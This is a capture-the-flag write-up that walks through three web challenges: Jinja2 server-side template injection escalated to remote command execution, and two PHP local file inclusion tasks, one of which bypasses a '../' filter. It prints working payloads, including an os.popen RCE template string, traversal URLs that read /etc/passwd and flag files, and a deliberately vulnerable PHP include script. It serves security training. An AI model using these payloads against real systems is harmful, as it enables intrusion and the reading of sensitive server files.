# SecuriNets ISI Friendly CTF 2023-2024

This writeup will guide you to solve the tasks:

- [Server Side Template Injection](##server-side-template-injection)
- [Local file inclusion 0 (LFI0)](##local-file-inclusion-(LFI0))
- [Local file inclusion 1 (LFI1)](##local-file-inclusion-(LFI1))

##Server-Side-Template-Injection 

### Confirmation of Jinja2 Usage

The title of this challenge, "Server Side Template Injection," coupled with the description, strongly suggests the use of the Jinja2 template engine in the web application. The mention of a Python web framework aligns with the fact that Jinja2 is commonly employed in Python web development.

### Supporting Argument

1. **Title Significance:** The inclusion of "Template Injection" in the title implies a vulnerability related to the rendering of templates on the server side. Jinja2 is a popular template engine in Python, making it a plausible choice for the web app's backend.

2. **Python Web Framework Hint:** The description hints at the web app being built with a Python framework. Considering Jinja2 is commonly used with frameworks like Flask and Django, it strengthens the case for Jinja2 being the template engine in play.

### Basic Jinja2 Injection Examples

In your research, you've uncovered some basic examples of Jinja2 SSTI, including:

- `{{4*4}}`: Evaluates to 16

#### Exploit Test

1. **Test Payload:** Jinja2 - Basic Injection Test.

<img src="img/1.png" alt="Payload 1" width="600" height="400">

   *Description: `{{7*7}}`*

2. **Test Result:** The application responds with the output of the '{{7*7}}' command.

<img src="img/2.png" alt="Payload 1" width="600" height="400">

### SSTI Exploit for Remote Code Execution (RCE)

After confirming the presence of SSTI in the web application, the next step is to exploit it for Remote Code Execution (RCE). One common payload for achieving RCE in Jinja2 is as follows:

```jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

1. **Test Payload:** Exploit the SSTI by calling os.popen().read().

<img src="img/3.png" alt="Payload 1" width="600" height="400">

3. **Test Result:** The application responds with the output of the 'id' command.

<img src="img/4.png" alt="Payload 1" width="600" height="400">

   *Description: Confirm that the application responds with the output of the 'id' command, indicating successful SSTI execution.*

4. **Directory Listing**
   - **Payload:** Modify the payload to list the contents of the current directory using `ls`.

<img src="img/5.png" alt="Payload 1" width="600" height="400">

- **Test Result:** Execute the payload and observe the result to see the files and directories in the current location.

<img src="img/6.png" alt="Payload 1" width="600" height="400">

5. **Read Flag Contents**
   - **Payload:** Modify the payload to cat the contents of `flag.txt`.

     ```jinja
     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
     ```

<img src="img/7.png" alt="Payload 1" width="600" height="400">

- **Test Result:** Execute the payload and observe the result to read the contents of the `flag.txt` file: `Securinets{55t1_D0N3}`.

<img src="img/8.png" alt="Payload 1" width="600" height="400">

## Local File Inclusion (LFI0)

### Confirmation of Local File Inclusion 

 Confirmation of Local File Inclusion (LFI) is a crucial step in identifying and fixing vulnerabilities in web applications that use PHP. In LFI, attackers 
 exploit improper input validation to include unauthorized files. To confirm LFI, they might use traversal sequences like "../" or null bytes (%00) to navigate 
 directories or terminate file paths. This helps them gather information about the server environment and potentially execute malicious code. Prevention involves 
 robust input validation, file path whitelisting, and regular software updates. Addressing LFI promptly is essential for maintaining web application security.

### Supporting Argument

> Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the page parameter to 
  include local or remote files, leading to unauthorized access or code execution.

1. **Identify Vulnerable Script:**

```
<?php
$file = $_GET['page'];
include($file);
?>
```

2. **Exploit Directory Traversal:**

   In the following examples we include the **/etc/passwd** file, check the Directory & Path Traversal chapter for more interesting files.

```plaintext
http://example.com/index.php?page=../../../etc/passwd
```

3. **include 'flag.txt' File:**

   Once I successfully traverse directories, I can include the flag.txt file.

```plaintext
http://example.com/index.php?page=../../../../flag.txt
```
4. **Explanation :**

- **../**: Move up one directory level.
- **page=../../../../flag.txt**: Traverse up four levels to the root directory and include the flag.txt file.

5. **Result :**

   I've now successfully included the flag.txt file, allowing me to view its content or execute any malicious code it may contain.

## Local File Inclusion (LFI1) 
### Introduction

Local File Inclusion (LFI) vulnerabilities can be exploited when user input is not properly sanitized, allowing attackers to include unauthorized files. In cases where filters are implemented to block certain traversal sequences like `"../"` attackers can attempt to bypass these filters using alternative techniques. One common filter evasion technique is to use variations of traversal sequences, such as `"....//"` or `"%2f,"` to trick the filtering mechanism and achieve directory traversal.

### Supporting Argument

Consider a PHP script that includes a file based on user input. A common security measure is to use `preg_replace` to filter out `"../"` from the user input, intending to prevent directory traversal.

```php
<?php
$file = $_GET['page'];
// Filter out '../' to prevent directory traversal
$file = preg_replace('/\.\.\//', '', $file);
include($file);
?>
```
### Bypassing the Filter

1. **Exploiting with "....//"**

   If the filter is specifically looking for `"../"` an attacker can use variations like 
   `"....//"` to bypass the filter.

```plaintext
http://example.com/index.php?page=....//....//....//....//flag.txt
```
2. **Exploiting with "%2f"**

   URL encoding can also be used to bypass filters. In this case, the attacker can use `"%2f"` 
   as an alternative to `"/"`.

```plaintext
http://example.com/index.php?page=..**%2f**..**%2f**..**%2f**..**%2f**flag.txt
```
3. **Explanation:**
   **Filter Bypass :** The variations `"....//"` and `"%2f"` are used to bypass the regular 
     expression filter that replaces `"../"` in the user input. The filtering mechanism is 
     fooled, allowing the traversal sequence to pass through.
4. **Result**
     By successfully bypassing the `"../"` filter, an attacker can include files outside of 
     the 
     intended directory, potentially leading to unauthorized access and code execution. It's 
     crucial to regularly update and improve input validation mechanisms to defend against 
     evolving attack techniques.




